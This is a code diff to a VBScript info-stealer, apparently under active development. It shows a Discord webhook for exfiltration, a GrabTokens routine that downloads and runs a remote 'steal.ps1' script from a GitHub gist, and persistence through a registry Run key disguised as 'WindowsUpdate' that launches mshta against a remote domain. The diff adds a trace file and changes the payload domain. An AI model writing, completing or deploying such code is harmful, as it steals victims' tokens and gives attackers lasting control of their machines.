@@ -16,6 +16,10 @@ RE_WH = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6ML
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
+' TRACE
+Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
+Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
+
 ' --- Initial Grab ---
 Call GrabTokens
 Call IP
@@ -264,7 +268,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta https://dicexrig.app/"
+    Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -282,7 +286,7 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/6f9a82f866d336ee4f1527fb54fd0c83/raw/steal.ps1?v=3", False
+    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/6f9a82f866d336ee4f1527fb54fd0c83/raw/steal.ps1?v=999", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
